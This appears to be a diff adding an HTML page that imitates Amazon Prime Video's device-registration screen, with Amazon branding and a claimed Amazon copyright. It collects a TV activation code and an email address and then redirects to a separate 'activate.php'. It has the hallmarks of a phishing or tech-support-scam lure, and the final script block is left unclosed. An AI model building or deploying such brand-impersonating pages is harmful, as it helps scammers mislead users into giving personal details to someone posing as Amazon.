@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Poppins:wght@200&display=swap">
+    
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Poppins', sans-serif; /* Change the font-family to Poppins */
+        }
+
+        header {
+            background-color: #ff;
+            padding: 10px;
+            text-align: center;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 60px;
+        }
+
+        img {
+            width: 10%;
+            height: auto;
+            margin-right: 10px;
+            margin-left: -60%;
+        }
+
+        main {
+            padding: 20px;
+            text-align: center;
+            height: 370px;
+            background: rgba(205, 205, 205, 0.7) url('amazommytv33.jpg');
+            background-size: cover;
+            background-position: center;
+            position: relative;
+        }
+
+        .boxed-container {
+            width: 50%;
+            margin: 0 auto;
+            border: 2px solid #ccc;
+            padding: 20px;
+            position: relative;
+            background-color: #f5f5f5;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1); /* Improved box shadow */
+        }
+
+        input {
+            width: calc(100% - 22px);
+            padding: 10px;
+            box-sizing: border-box;
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
+        }
+
+        .error-border {
+            border: 2px solid red;
+        }
+
+        button {
+            width: 46%;
+            padding: 12px;
+            box-sizing: border-box;
+            background-color: #0096FF;
+            color: white;
+            border: none;
+            cursor: pointer;
+            margin-top: 10px;
+            border-radius: 5px;
+        }
+
+        .boxed-container h3, .boxed-container h4, .boxed-container label {
+            text-align: left;
+            margin-bottom: 10px;
+            width: 100%;
+            color: #333;
+        }
+        
+        .boxed-container h3, .boxed-container h4 {
+            font-size: 1.2em;
+            margin:2%;
+        }
+
+        span {
+            font-size: 20px;
+            color: #800000;
+        }
+
+        span1 {
+            color: #800000;
+        }
+            
+        .instructions-container {
+        background-color: rgba(255, 255, 255, 0.9);
+        padding: 20px;
+        border-radius: 10px;
+        margin-top: 20px;
+        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+        opacity: 0;
+        transition: opacity 1s ease-in-out;
+    }
+
+    .instructions-container h2 {
+        font-size: 24px;
+        margin-bottom: 10px;
+    }
+    
+    .fade-in {
+    opacity: 1;
+}
+
+    .instruction-step {
+        margin-top: 15px;
+        font-size: 16px;
+    }
+    @keyframes bounce {
+            0%, 20%, 50%, 80%, 100% {
+                transform: translateY(0);
+            }
+            40% {
+                transform: translateY(-15px);
+            }
+            60% {
+                transform: translateY(-10px);
+            }
+        }
+        .special-heading {
+            color: #0096FF;
+            font-size: 28px;
+            margin-top: 30px;
+            animation: bounce 1.5s infinite;
+        }
+    </style>
+    <title>Register verification code</title>
+</head>
+<body>
+    <header>
+        <img src="Amazon-Prime-Video-Logo.png" alt="Your Logo">
+        <h1 style="color:red;"></h1>
+    </header>
+    
+    <main>
+        <h1 style="color:white;">Register Your Compatible Devices</h1>
+        <p style="color: white; font-weight: bold; text-shadow: 0 0 10px rgba(255, 255, 255, 0.8);">Enter the code shown on your TV or device to register it with your Amazon Prime account...</p>
+
+        <div class="boxed-container">
+
+            <h3>Enter Registration Code:</h3>
+            <h4>Activation code (6 digits)</h4>
+            <input type="text" id="text" name="SingleLine" placeholder="GHJ65-" maxlength="6" oninput="checkInputLength(this)">
+        </div>
+        <br>
+        <div class="boxed-container">
+            
+            <h3 style="font-size:22px;">Enter your Email</h3>
+            <h4 style="font-size:17px;">We'll help you to register your amazon prime account.</h4>
+            <input type="email" id="email" name="SingleLine2" placeholder="Enter Your Email" maxlength="25" oninput="checkInputLength(this)">
+
+        </div>
+        <br>
+        <button type="button" onclick="submitForm()"><span style="color:white">Register Device</span></button>
+        <br>
+        <br>
+        
+        <div class="instructions-container fade-in">
+   <h2 class="special-heading">Where is my Registration Code?</h2>
+
+    <p style="color: white; font-size: 16px;">Follow these simple steps to find your registration code:</p>
+    
+    <div class="instruction-step">
+        <strong>Step 1:</strong> Open the Amazon Prime Video app on your device.
+    </div>
+
+    <div class="instruction-step">
+        <strong>Step 2:</strong> Select "Register a Device" or "Activate a Device."
+    </div>
+
+    <div class="instruction-step">
+        <strong>Step 3:</strong> Your registration code will appear on the left side of the screen.
+    </div>
+</div>
+<footer style="background-color: #333; color: white; text-align: center; padding: 10px;">
+        <p>&copy; 2024 @Amazon Prime Video. All rights reserved.</p>
+    </footer>
+    </main>
+    <script>
+        // Use JavaScript to add the fade-in class after a delay
+        document.addEventListener("DOMContentLoaded", function () {
+            setTimeout(function () {
+                document.querySelector(".instructions-container").classList.add("fade-in");
+            }, 500); // Adjust the delay as needed
+        });
+    </script>
+<script>
+            function submitForm() {
+                // Perform any form validation if needed
+
+                // Redirect to activate.php
+                window.location.href = 'activate.php';
+            }
+
+            function checkInputLength(inputElement) {
+                // Add your input length validation logic here if needed
+            }
+</body>
+</html>
